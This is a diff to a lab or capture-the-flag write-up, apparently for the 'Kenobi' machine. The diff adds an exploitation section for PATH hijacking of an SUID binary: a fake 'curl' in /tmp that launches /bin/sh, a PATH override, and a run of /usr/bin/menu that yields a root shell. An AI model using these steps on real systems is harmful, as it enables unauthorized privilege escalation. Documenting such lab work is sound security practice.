@@ -142,12 +142,22 @@ The SUID binary executes the following commands without specifying their full pa
    ------------
 ## Security Impact
 Because the binary searches for these commands using the user's PATH,an attacker can place a maalicious executable earlier in the PATH and have it executed with root privileges.
-
-## Flags Obtained
-
-## User Flag
-
-## Root Flag
+This indicates a PATH hijacking vulnerability.
+## Exploitations
+**Commands**
+```bash
+cd /tmp
+echo "/bin/sh" > curl
+chmod +x curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+```
+Selecting the menu option that executes curl caused the SUID binary to run malicious scripts from /tmp,resulting in a root shell.
+## Verification
+  whoami
+## Output
+   root
+![Output](kenobi_output.png)
 
 ## Recommendations 
 - Keep software updated.
